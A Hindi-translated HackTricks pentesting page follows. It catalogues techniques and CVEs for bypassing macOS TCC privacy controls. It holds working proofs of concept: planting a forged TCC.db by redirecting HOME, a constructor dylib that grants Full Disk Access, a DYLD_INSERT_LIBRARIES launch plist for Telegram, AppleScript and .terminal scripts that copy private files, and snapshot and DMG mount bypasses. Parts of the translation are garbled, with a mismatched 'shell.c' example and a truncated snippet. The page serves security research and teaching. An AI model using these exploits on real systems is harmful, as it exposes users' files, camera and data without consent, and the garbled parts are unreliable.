# macOS TCC बाईपास

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>

## कार्यक्षमता के अनुसार

### लेखन बाईपास

यह कोई बाईपास नहीं है, यह बस TCC का काम करने का तरीका है: **यह लेखन से सुरक्षा नहीं करता है**। यदि टर्मिनल **किसी उपयोगकर्ता के डेस्कटॉप को पढ़ने की अनुमति नहीं है तो फिर भी उसमें लिख सकता है**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**विस्तारित गुणांक `com.apple.macl`** नए **फ़ाइल** में जोड़ा जाता है ताकि **निर्माता ऐप** को इसे पढ़ने की अनुमति मिल सके।

### TCC निर्दिष्ट पथ

किसी TCC अनुमति को एक ऐप्लिकेशन को देने का सबसे सामान्य तरीका बंडल का उपयोग करना है। हालांकि, यह भी संभव है कि **एक्सेस को चोरी कर सकते हैं** जब आप बाइनरी को अधिलेखित कर सकते हैं।

आप इस कोड का उपयोग करके एक बाइनरी को कॉल कर सकते हैं:

{% tabs %}
{% tab title="invoker.m" %}
```
#import <Foundation/Foundation.h>

// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Check if the argument is provided
if (argc != 2) {
NSLog(@"Usage: %s <path_to_executable>", argv[0]);
return 1;
}

// Create a new task
NSTask *task = [[NSTask alloc] init];

// Set the task's launch path to the provided argument
[task setLaunchPath:@(argv[1])];

// Launch the task
[task launch];

// Wait for the task to complete
[task waitUntilExit];
}
return 0;
}
```
{% tab title="shell.c" %}

यहां हम एक साधारण C प्रोग्राम देख रहे हैं जिसे "shell.c" नामक फ़ाइल में सहेजा गया है। यह प्रोग्राम एक नए शेल प्रोसेस को बनाने के लिए fork और execvp सिस्टम कॉल का उपयोग करता है। इसका उद्देश्य है कि यह एक नए शेल प्रोसेस में एक नए कमांड प्रारंभ करेगा।

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid;
    int status;

    pid = fork();

    if (pid == 0) {
        // Child process
        char *args[] = {"/bin/sh", "-c", "ls -l", NULL};
        execvp(args[0], args);
        perror("execvp");
        _exit(1);
    } else if (pid > 0) {
        // Parent process
        waitpid(pid, &status, 0);
    } else {
        // Fork failed
        perror("fork");
        return 1;
    }

    return 0;
}
```

इस प्रोग्राम को कंपाइल करने के लिए निम्नलिखित कमांड का उपयोग करें:

```shell
gcc -o shell shell.c
```

इसके बाद, निम्नलिखित कमांड का उपयोग करके प्रोग्राम को चलाएं:

```shell
./shell
```

इस प्रोग्राम के परिणामस्वरूप, नए शेल प्रोसेस में "ls -l" कमांड चलाया जाएगा और उसका आउटपुट मुद्रित होगा।

{% endtab %}
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  // For execl and fork

// gcc shell.c -o shell
// mv shell </path/bin/with/TCC>

int main() {
pid_t pid = fork();

if (pid == -1) {
// Fork failed
perror("fork");
return 1;
} else if (pid == 0) {
// Child process
execl("/Applications/iTerm.app/Contents/MacOS/iTerm2", "iTerm2", (char *) NULL);

// execl only returns if there's an error
perror("execl");
exit(EXIT_FAILURE);
} else {
// Parent process
int status;
waitpid(pid, &status, 0);  // Wait for the child process to finish

if (WIFEXITED(status)) {
// Return the exit status of iTerm2
return WEXITSTATUS(status);
}
}

return 0;
}
```
{% endtab %}
{% endtabs %}



### SSH बाईपास

डिफ़ॉल्ट रूप से **SSH के माध्यम से पूरी डिस्क एक्सेस** होता था। इसे अक्षम करने के लिए, आपको इसे सूची में रखना होगा लेकिन अक्षम करना होगा (सूची से हटाने से ये अधिकार हटाए नहीं जाएंगे):

![](<../../../../../.gitbook/assets/image (569).png>)

यहां आपको कुछ **मैलवेयर्स के उदाहरण मिलेंगे जिन्होंने इस सुरक्षा को दौर करने में सफलता प्राप्त की है**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
ध्यान दें कि अब SSH को सक्षम करने के लिए आपको **पूरी डिस्क एक्सेस** की आवश्यकता होती है
{% endhint %}

### एक्सटेंशन्स का हैंडल करें - CVE-2022-26767

फ़ाइलों को **`com.apple.macl`** एट्रिब्यूट दिया जाता है ताकि एक **निश्चित एप्लिकेशन को उसे पढ़ने की अनुमति मिल सके**। यह एट्रिब्यूट सेट होता है जब आप एक फ़ाइल को एक ऐप पर **ड्रैग एंड ड्रॉप** करते हैं, या जब उपयोगकर्ता एक फ़ाइल को **डबल-क्लिक** करके इसे **डिफ़ॉल्ट एप्लिकेशन** के साथ खोलता है।

इसलिए, एक उपयोगकर्ता **एक खतरनाक ऐप** को रजिस्टर कर सकता है जो सभी एक्सटेंशन्स को हैंडल करेगा और लॉन्च सर्विसेज को कॉल करेगा ताकि किसी भी फ़ाइल को **खोलें** (इसलिए खतरनाक फ़ाइल को पढ़ने की अनुमति मिलेगी)।

### iCloud

एंटाइटलमेंट **`com.apple.private.icloud-account-access`** के माध्यम से **`com.apple.iCloudHelper`** XPC सेवा के साथ संवाद करना संभव है जिससे **iCloud टोकन प्रदान किए जा सकते हैं**।

**iMovie** और **Garageband** में इस एंटाइटलमेंट के साथ और भी अनुमतियां थीं।

उस एंटाइटलमेंट से iCloud टोकन प्राप्त करने के बारे में अधिक **जानकारी** के लिए टॉक देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** अनुमति वाले ऐप को अन्य ऐप्स को **नियंत्रित करने की क्षमता** होगी। इसका मतलब है कि यह अन्य ऐप्स को प्रदान की गई अनुमतियों का दुरुपयोग करने की क्षमता हो सकती है।

Apple स्क्रिप्ट के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

उदाहरण के लिए, यदि एक ऐप को **`iTerm` पर ऑटोमेशन अनुमति** है, उदाहरण के लिए इस उदाहरण में **`Terminal`** को iTerm पर पहुंच है:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm पर

FDA नहीं होने वाले Terminal, iTerm को कॉल कर सकता है, जिसमें FDA होता है, और इसे उपयोग करके कार्रवाई कर सकता है:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder के ऊपर

या अगर किसी ऐप को Finder के ऊपर एक्सेस है, तो वह एक स्क्रिप्ट जैसा यह हो सकता है:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## ऐप के व्यवहार द्वारा

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

उपयोगकर्ता भूमिका **tccd डेमन** जो **`HOME`** **env** चर का उपयोग करता है ताकि यह TCC उपयोगकर्ता डेटाबेस तक पहुंच सके: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange पोस्ट](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार और क्योंकि TCC डेमन `launchd` के माध्यम से मौजूदा उपयोगकर्ता डोमेन के भीतर चल रहा है, इसलिए इसे पास किए गए सभी वातावरण चरों को **नियंत्रित करना संभव है**।\
इस प्रकार, एक **हमलावर यह सेट कर सकता है `$HOME` वातावरण** चर को **`launchctl`** में एक **नियंत्रित** **निर्देशिका** की ओर पहुंच करने के लिए, **TCC** डेमन को **पुनः आरंभ** कर सकता है, और फिर **सीधे TCC डेटाबेस को संशोधित** कर सकता है ताकि इसे अंतिम उपयोगकर्ता को प्रश्न न करते हुए **हर TCC अधिकार** को दे सके।\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - नोट्स

नोट्स को TCC सुरक्षित स्थानों तक पहुंच थी, लेकिन जब एक नोट बनाया जाता है तो यह **एक गैर-सुरक्षित स्थान में बनाया जाता है**। इसलिए, आप नोट्स से कह सकते हैं कि वह एक सुरक्षित फ़ाइल को एक नोट में कॉपी करें (इसलिए एक गैर-सुरक्षित स्थान में) और फिर फ़ाइल तक पहुंचें:

<figure><img src="../../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - ट्रांसलोकेशन

बाइनरी `/usr/libexec/lsd` जिसमें पुस्तकालय `libsecurity_translocate` होती है, के पास एंटाइटलमेंट `com.apple.private.nullfs_allow` थी जिससे इसे **nullfs** माउंट बनाने की अनुमति मिली और एंटाइटलमेंट `com.apple.private.tcc.allow` थी जिसमें **`kTCCServiceSystemPolicyAllFiles`** होता है ताकि हर फ़ाइल तक पहुंच सकें।

"लाइब्रेरी" को क्वारंटीन गुणांक जोड़ना संभव था, **`com.apple.security.translocation`** XPC सेवा को कॉल करना संभव था और फिर यह "लाइब्रेरी" को **`$TMPDIR/AppTranslocation/d/d/Library`** से मैप कर देता था जहां लाइब्रेरी के अंदर के सभी दस्तावेज़ों तक पहुंच संभव थी।

### CVE-2023-38571 - संगीत और टीवी <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`संगीत`** में एक दिलचस्प सुविधा है: जब यह चल रहा होता है, तो यह उपयोगकर्ता के "मीडिया पुस्तकालय" में ड्रॉप की गई फ़ाइलों को **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** में आयात करेगा। इसके अलावा, यह कुछ इस तरह का कॉल करता है: **`rename(a, b);`** जहां `a` और `b` हैं:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

यह **`rename(a, b);`** व्यवहार एक **रेस कंडीशन** के लिए संक्रमित है, क्योंकि यह संभव है कि "Automatically Add to Music.localized" फ़ोल्डर में एक नकली **TCC.db** फ़ाइल डाली जाए और फिर जब नया फ़ोल्डर (b) बनाया जाता है तो फ़ाइल की कॉपी करने के बाद उसे हटा दिया जाता है, और इसे **`~/Library/Application Support/com.apple.TCC`**/ की ओर पॉइंट किया जाता है।

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

यदि **`SQLITE_SQLLOG_DIR="पथ/फ़ोल्डर"`** है, तो यह मतलब होता है कि **किसी भी खुली डेटाबेस को उस पथ पर कॉपी किया जाता है**। इस CVE में इस नियंत्रण का दुरुपयोग किया गया था ताकि एक प्रक्रिया जिसमें FDA वाली TCC डेटाबेस हो, उसके अंदर लिखा जा सके, और फिर **`SQLITE_SQLLOG_DIR`** का उपयोग फ़ाइलनाम में एक **सिंबलिंक** के साथ किया जा सके ताकि जब वह डेटाबेस **खोला जाता है**, उपयोगकर्ता की **TCC.db ओवरराइट** हो जाती है।\
[**अधिक जानकारी यहां**](https://youtu.be/f1HA5QhLQ7Y?t=20548)।

### **SQLITE\_AUTO\_TRACE**

यदि पर्यावरण चर **`SQLITE_AUTO_TRACE`** सेट है, तो पुस्तकालय **`libsqlite3.dylib`** सभी SQL क्वेरी को लॉग करना शुरू कर देगी। कई एप्लिकेशन इस पुस्तकालय का उपयोग करते थे, इसलिए उनके सभी SQLite क्वेरी को लॉग करना संभव था।

कई Apple एप्लिकेशन ने TCC सुरक्षित जानकारी तक पहुंच करने के लिए इस पुस्तकालय का उपयोग किया।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Apple Remote Desktop

जैसे ही आप रूट के रूप में इस सेवा को सक्षम करते हैं, **ARD एजेंट को पूरी डिस्क एक्सेस** हो जाता है जिसे उपयोगकर्ता द्वारा इस्तेमाल किया जा सकता है ताकि वह एक नया **TCC उपयोगकर्ता डेटाबेस** कॉपी कर सके।

## **NFSHomeDirectory** द्वारा

TCC उपयोगकर्ता को नियंत्रित करने के लिए एक डेटाबेस का उपयोग करता है जो उपयोगकर्ता के HOME फ़ोल्डर में संसाधित संसाधनों का उपयोगकर्ता को नियंत्रित करने के लिए होता है **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, यदि उपयोगकर्ता को एक $HOME env चर के साथ एक **अलग फ़ोल्डर** की ओर इशारा करने के लिए TCC को पुनः आरंभ करने में सफल होता है, तो उपयोगकर्ता किसी भी ऐप को किसी भी TCC अनुमति के लिए TCC डेटाबेस बना सकता है। **/Library/Application Support/com.apple.TCC/TCC.db** और TCC को धोखा देने के लिए धोखा दे सकता है।

{% hint style="success" %}
ध्यान दें कि Apple उपयोगकर्ता के प्रोफ़ाइल में संग्रहीत सेटिंग का उपयोग करता है **`NFSHomeDirectory`** विशेषता के रूप में **`$HOME`** के मान के लिए, इसलिए यदि आप किसी ऐप्लिकेशन को संशोधित करने की अनुमति देने के लिए अनुमति है (**`kTCCServiceSystemPolicySysAdminFiles`**), तो आप एक TCC बाईपास के साथ इस विकल्प को **युद्धास्पद** बना सकते हैं।
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है उपयोगकर्ता के **HOME** फ़ोल्डर को संशोधित करने के लिए।

1. लक्ष्य ऐप के लिए _csreq_ ब्लॉब प्राप्त करें।
2. आवश्यक उपयोग और _csreq_ ब्लॉब के साथ एक नकली _TCC.db_ फ़ाइल प्लांट करें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) का उपयोग करके उपयोगकर्ता के डायरेक्टरी सेवाओं एंट्री को निर्यात करें।
4. उपयोगकर्ता के डायरेक्टरी सेवाओं एंट्री को संशोधित करें ताकि उपयोगकर्ता के होम डायरेक्टरी बदल जाए।
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करके संशोधित डायरेक्टरी सेवाओं एंट्री को आयात करें।
6. उपयोगकर्ता के _tccd_ को रोकें और प्रक्रिया को पुनः आरंभ करें।

दूसरा POC **`/usr/libexec/configd`** का उपयोग करता है जिसमें `com.apple.private.tcc.allow` वैल्यू `kTCCServiceSystemPolicySysAdminFiles` के साथ होता है।\
यदि कोई हमलावर **`configd`** को **`-t`** विकल्प के साथ चलाता है, तो वह एक **कस्टम Bundle लोड** कर सकता है। इसलिए, यह एक्सप्लॉइट **`dsexport`** और **`dsimport`** विधि को उपयोगकर्ता के होम डायरेक्टरी को बदलने के लिए **`configd` कोड इंजेक्शन** के साथ बदल देता है।

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।

## प्रक्रिया इंजेक्शन द्वारा

प्रक्रिया में कोड इंजेक्शन करने और उसके TCC अधिकारों का दुरुपयोग करने के लिए विभिन्न तकनीकें हैं:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

इसके अलावा, TCC को बाईपास करने के लिए सबसे सामान्य प्रक्रिया इंजेक्शन **प्लगइन्स (लोड पुस्तकालय)** के माध्यम से किया जाता है।\
प्लगइन्स अतिरिक्त कोड आमतौर पर पुस्तकालय या प्लिस्ट के रूप में होते हैं, जो **मुख्य एप्लिकेशन द्वारा लोड किए जाएंगे** और इसके संदर्भ में निष्पादित होंगे। इसलिए, यदि मुख्य एप्लिकेशन को TCC प्रतिबंधित फ़ाइलों (अनुमतियों या अधिकारों के माध्यम से) का उपयोग करने की अनुमति है, तो **कस्टम कोड भी उसे होगा**।

### CVE-2020-27937 - Directory Utility

ऐप्लिकेशन `/System/Library/CoreServices/Applications/Directory Utility.app` में एंटाइटलमेंट **`kTCCServiceSystemPolicySysAdminFiles`**, **`.daplug`** एक्सटेंशन वाले प्लगइन्स लोड करता था और **हार्डन** रनटाइम नहीं था।

इस CVE को युद्धास्पद बनाने के लिए, **`NFSHomeDirectory`** को **बदला** जाता है (पिछले एंटाइटलमेंट का दुरुपयोग करके) ताकि उपयोगकर्ता के TCC डेटाबेस को ले लिया जा सके।

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/change-home-directory-and
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।

### डिवाइस अवस्थान परत (DAL) प्लग-इन्स

कोर मीडिया I/O के माध्यम से कैमरा स्ट्रीम खोलने वाले सिस्टम एप्लिकेशन (**`kTCCServiceCamera`** वाले ऐप्स) `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित इन प्लग-इन्स को प्रक्रिया में लोड करते हैं (SIP सीमित नहीं होता है)।

वहां एक साधारित **कंस्ट्रक्टर** के साथ एक पुस्तकालय संग्रहित करना कोड **इंजेक्शन** करने के लिए काम करेगा।

इसमें कई Apple एप्लिकेशन भी संकटग्रस्त थे।

### Firefox

Firefox एप्लिकेशन में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` अधिकार होते थे:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
इस [**मूल रिपोर्ट की जांच करें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/) के बारे में अधिक जानकारी के लिए।

### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` में **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** इंटाइटलमेंट्स थे, जिससे प्रक्रिया में कोड इंजेक्शन करने और TCC अधिकारों का उपयोग करने की अनुमति मिली।

### CVE-2023-26818 - Telegram

Telegram में **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** इंटाइटलमेंट्स थे, इसलिए इसका दुरुपयोग करके इसकी अनुमतियों तक पहुंच मिल सकती थी, जैसे कैमरे के साथ रिकॉर्डिंग करना। आप [**व्रिटअप में पेलोड ढूंढ सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)।

ध्यान दें कि एक **कस्टम प्लिस्ट** को इंजेक्शन करने के लिए एक एनवायरनमेंट वेरिएबल का उपयोग करने के लिए यहां एक लाइब्रेरी लोड करने के लिए बनाई गई थी और **`launchctl`** का उपयोग किया गया था:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## खुले आवाहन द्वारा

सैंडबॉक्स के बीच **`open`** को आवाहित करना संभव है।

### टर्मिनल स्क्रिप्ट्स

टेक्निकल लोगों द्वारा उपयोग किए जाने वाले कंप्यूटरों में टर्मिनल को **पूर्ण डिस्क एक्सेस (FDA)** देना आम बात है। और इसका उपयोग करके **`.terminal`** स्क्रिप्ट्स को आवाहित करना संभव है।

**`.terminal`** स्क्रिप्ट्स plist फ़ाइलें होती हैं, जैसे इसमें दिए गए कमांड को निष्पादित करने के लिए **`CommandString`** कुंजी होती है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
एक एप्लिकेशन एक ऐसी स्थान पर एक टर्मिनल स्क्रिप्ट लिख सकती है जैसे /tmp और इसे निम्नलिखित तरीके से लॉन्च कर सकती है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## माउंट करके

### CVE-2020-9771 - माउंट\_apfs TCC बाईपास और प्रिविलेज एस्केलेशन

**कोई भी उपयोगकर्ता** (हालांकि अनाधिकृत भी) एक टाइम मशीन स्नैपशॉट बना सकता है और उस स्नैपशॉट के **सभी फ़ाइलों तक पहुंच** कर सकता है।\
**केवल प्रिविलेज्ड** जो आवेदन का उपयोग करता है (जैसे `Terminal`) को **फुल डिस्क एक्सेस** (FDA) एक्सेस (`kTCCServiceSystemPolicyAllfiles`) की आवश्यकता होती है जो एक व्यवस्थापक द्वारा प्रदान की जानी चाहिए।

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

एक और विस्तृत व्याख्या [**मूल रिपोर्ट में मिल सकती है**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 और CVE-2021-30808 - TCC फ़ाइल पर माउंट करें

यद्यपि TCC DB फ़ाइल सुरक्षित है, लेकिन एक नई TCC.db फ़ाइल को **डायरेक्टरी पर माउंट करना संभव था**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
आप मूल लेख में **पूर्ण उत्पादन** की जांच करें। [**मूल लेख**](https://theevilbit.github.io/posts/cve-2021-30808/) में।

### asr

टूल **`/usr/sbin/asr`** को TCC सुरक्षा को छोड़कर पूरी डिस्क की कॉपी और उसे दूसरी जगह माउंट करने की अनुमति देता था।

### स्थान सेवाएं

**`/var/db/locationd/clients.plist`** में तीसरा TCC डेटाबेस होता है जो स्थान सेवाओं तक पहुंच की अनुमति देने वाले ग्राहकों को दर्शाता है।\
**`/var/db/locationd/` डिएमजी माउंटिंग से सुरक्षित नहीं था**, इसलिए हमारी खुद की प्लिस्ट माउंट करना संभव था।

## स्टार्टअप ऐप्स द्वारा

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grep द्वारा

कई बार फ़ाइलों में संवेदनशील जानकारी जैसे ईमेल, फ़ोन नंबर, संदेश... संरक्षित नहीं स्थानों में संग्रहीत होती हैं (जो Apple में एक संकट के रूप में गिनी जाती हैं)।

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## संश्लेषित क्लिक

यह अब काम नहीं करता है, लेकिन यह [**पहले करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics इवेंट्स**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) का उपयोग करके एक और तरीका:

<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## संदर्भ

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
